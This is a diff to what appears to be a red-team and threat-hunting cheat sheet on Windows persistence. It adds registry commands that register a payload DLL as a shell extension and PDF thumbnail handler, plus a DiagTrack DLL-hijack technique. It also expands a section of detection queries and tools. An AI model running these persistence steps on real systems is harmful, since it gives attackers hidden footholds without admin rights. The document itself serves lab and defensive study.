+reg add "HKCU\Software\Classes\CLSID\$guid\InprocServer32" /ve /t REG_SZ /d "C:\lab\payload.dll" /f
+reg add "HKCU\Software\Classes\CLSID\$guid\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
+
+# Optional: thumbnail handler — fires when folder with PDF files is opened
+reg add "HKCU\Software\Classes\.pdf\shellex\{E357FCCD-A995-4576-B01F-234630154E96}" /ve /t REG_SZ /d $guid /f
+
+# Approve extension (required Windows 10+)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved" /v $guid /t REG_SZ /d "EvilShellExt" /f
+
+# Verify
+reg query "HKCU\Software\Classes\*\shellex\ContextMenuHandlers\EvilMenu"
+
+# Cleanup
+reg delete "HKCU\Software\Classes\*\shellex\ContextMenuHandlers\EvilMenu" /f
+reg delete "HKCU\Software\Classes\CLSID\$guid" /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved" /v $guid /f
+```
+
+> **DLL interfaces required:** `IContextMenu`, `IShellExtInit`.
+
+---
+
+## 67. DiagTrack DLL Hijack
+**TTP:** T1574.002 | **Admin:** ❌ | **APT:** Custom/Red Team
+
+Abuses DiagTrack (Windows Telemetry) extension paths — drops a DLL with a name matching an expected plugin in a user-writable Diagnostics directory. Fires on telemetry collection events.
+
+```powershell
+# Step 1: Check which DiagTrack paths exist and are user-writable
+$diagPaths = @(
+    "$env:ProgramData\Microsoft\Diagnosis\ETLLogs",
+    "$env:LOCALAPPDATA\Microsoft\Windows\Diagnostic",
+    "$env:APPDATA\Microsoft\Diagnosis"
+)
+
+foreach ($p in $diagPaths) {
+    if (Test-Path $p) { Write-Host "[EXISTS] $p" -ForegroundColor Yellow }
+}
+
+# Step 2: Drop DLL with DiagTrack plugin name in writable path
+Copy-Item "C:\lab\payload.dll" "$env:LOCALAPPDATA\Microsoft\Windows\Diagnostic\DiagPackage.dll"
+
+# Step 3: Register extension path (HKCU — no admin)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v ExtensionDll /t REG_SZ /d "$env:LOCALAPPDATA\Microsoft\Windows\Diagnostic\DiagPackage.dll" /f
+
+# Verify
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack"
+
+# Cleanup
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v ExtensionDll /f
+Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Diagnostic\DiagPackage.dll"
+```
+
+---
+
 ## Threat Hunting Cheat Sheet
 
 ```powershell
@@ -1332,12 +1973,14 @@ Get-ChildItem "C:\Windows\System32\Tasks\" -Recurse -File | Where-Object { $_.Fu
 
 # === WINLOGON ===
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
 
 # === IFEO ===
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s
 
 # === SERVICES ===
 Get-Service | Where-Object {$_.StartType -eq "Automatic"} | Select Name, DisplayName, Status
+sc qc FakeSvc
 
 # === WMI SUBSCRIPTIONS ===
 Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
@@ -1346,6 +1989,47 @@ Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
 
 # === BITS JOBS ===
 bitsadmin /list /allusers /verbose
+
+# === APPINIT DLLs ===
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs
+
+# === LSA / SSP ===
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages"
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
+
+# === AMSI PROVIDERS ===
+reg query "HKLM\SOFTWARE\Microsoft\AMSI\Providers"
+
+# === NETWORK PROVIDERS ===
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"
+reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s | findstr /i "NetworkProvider"
+
+# === COM / HKCU OVERRIDES ===
+reg query "HKCU\Software\Classes\CLSID" /s
+
+# === COR_PROFILER ===
+reg query "HKCU\Environment" /v COR_PROFILER_PATH
+reg query "HKCU\Environment" /v COR_ENABLE_PROFILING
+
+# === PRINT PROCESSORS ===
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors"
+
+# === SHELL EXTENSIONS ===
+reg query "HKCU\Software\Classes\*\shellex\ContextMenuHandlers"
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved"
+
+# === CREDENTIAL PROVIDERS ===
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers"
+
+# === WINSOCK LSP ===
+netsh winsock show catalog
+
+# === NETSH HELPERS ===
+netsh show helper
+
+# === WINRT ACTIVATION ===
+reg query "HKCU\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId"
 
 # === SUSPICIOUS REG KEYS (obfuscated loaders) ===
 reg query "HKCU\Software\Microsoft\WindowsUpdate"
@@ -1368,11 +2052,13 @@ net localgroup "Administrators"
 | Tool | Use |
 |------|-----|
 | **Autoruns (Sysinternals)** | Complete persistence enumeration — gold standard |
-| **Process Monitor** | Real-time registry/file write detection |
-| **Sysmon** | Log process creation, reg changes, network |
+| **Process Monitor** | Real-time registry/file write detection; find phantom DLL hijack opportunities |
+| **Sysmon** | Log process creation, registry changes, DLL loads, network connections |
 | **Get-CimInstance** | PowerShell WMI-based enumeration |
 | **bitsadmin /list** | BITS job enumeration |
 | **wmic startup** | Startup item enumeration (legacy) |
+| **netsh winsock show catalog** | LSP DLL enumeration |
+| **netsh show helper** | netsh helper DLL enumeration |
 
 ---
 
